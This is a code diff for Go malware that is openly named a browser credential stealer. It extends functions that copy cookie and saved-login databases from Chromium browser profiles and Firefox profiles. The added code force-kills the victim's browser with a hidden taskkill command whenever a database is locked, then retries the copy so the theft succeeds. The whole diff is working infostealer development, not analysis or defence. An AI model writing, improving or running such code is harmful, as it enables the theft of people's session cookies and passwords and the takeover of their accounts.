@@ -9,6 +9,7 @@ func templateStealer() string {
 func runStealer() string {
 	results := map[string]string{}
 	var diagErrors []string
+	browserKilled = map[string]bool{}
 
 	browsers := []struct {
 		name  string
@@ -164,6 +165,18 @@ func disableWALMode(dbFile string) {
 	os.Remove(dbFile + "-shm")
 }
 
+func killBrowserProcess(exeName string) {
+	if exeName == "" {
+		return
+	}
+	cmd := exec.Command("taskkill", "/F", "/IM", exeName)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	_ = cmd.Run()
+	time.Sleep(500 * time.Millisecond)
+}
+
+var browserKilled = map[string]bool{}
+
 func stealChromiumCookies(userDataPath string, browserName string, browserExe string) (string, []string) {
 	profiles := []string{"Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"}
 	var allCookies strings.Builder
@@ -184,6 +197,16 @@ func stealChromiumCookies(userDataPath string, browserName string, browserExe st
 			_ = copyFileLocked(cookiePath+"-wal", tmpPath+"-wal", browserExe)
 			_ = copyFileLocked(cookiePath+"-shm", tmpPath+"-shm", browserExe)
 			copyOk = true
+		}
+
+		if !copyOk && !browserKilled[browserExe] {
+			browserKilled[browserExe] = true
+			killBrowserProcess(browserExe)
+			if err := copyFileLocked(cookiePath, tmpPath, browserExe); err == nil {
+				_ = copyFileLocked(cookiePath+"-wal", tmpPath+"-wal", browserExe)
+				_ = copyFileLocked(cookiePath+"-shm", tmpPath+"-shm", browserExe)
+				copyOk = true
+			}
 		}
 
 		var dbPath string
@@ -277,6 +300,14 @@ func stealChromiumLogins(userDataPath string, browserName string, browserExe str
 			copyOk = true
 		}
 
+		if !copyOk && !browserKilled[browserExe] {
+			browserKilled[browserExe] = true
+			killBrowserProcess(browserExe)
+			if err := copyFileLocked(loginPath, tmpPath, browserExe); err == nil {
+				copyOk = true
+			}
+		}
+
 		var dbPath string
 		if copyOk {
 			disableWALMode(tmpPath)
@@ -359,12 +390,21 @@ func stealFirefoxCookies(profilesPath string, browserExe string) (string, []stri
 		}
 
 		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_ff_cookies_%s_%d", e.Name(), time.Now().UnixNano()))
-		if err := copyFileLocked(cookiePath, tmpPath, "firefox.exe"); err != nil {
-			errs = append(errs, fmt.Sprintf("firefox/%s copy: %v", e.Name(), err))
-			continue
+		if err := copyFileLocked(cookiePath, tmpPath, browserExe); err != nil {
+			if !browserKilled[browserExe] {
+				browserKilled[browserExe] = true
+				killBrowserProcess(browserExe)
+				if err2 := copyFileLocked(cookiePath, tmpPath, browserExe); err2 != nil {
+					errs = append(errs, fmt.Sprintf("firefox/%s copy: %v", e.Name(), err2))
+					continue
+				}
+			} else {
+				errs = append(errs, fmt.Sprintf("firefox/%s copy: %v", e.Name(), err))
+				continue
+			}
 		}
-		_ = copyFileLocked(cookiePath+"-wal", tmpPath+"-wal", "firefox.exe")
-		_ = copyFileLocked(cookiePath+"-shm", tmpPath+"-shm", "firefox.exe")
+		_ = copyFileLocked(cookiePath+"-wal", tmpPath+"-wal", browserExe)
+		_ = copyFileLocked(cookiePath+"-shm", tmpPath+"-shm", browserExe)
 		defer os.Remove(tmpPath)
 		defer os.Remove(tmpPath + "-wal")
 		defer os.Remove(tmpPath + "-shm")
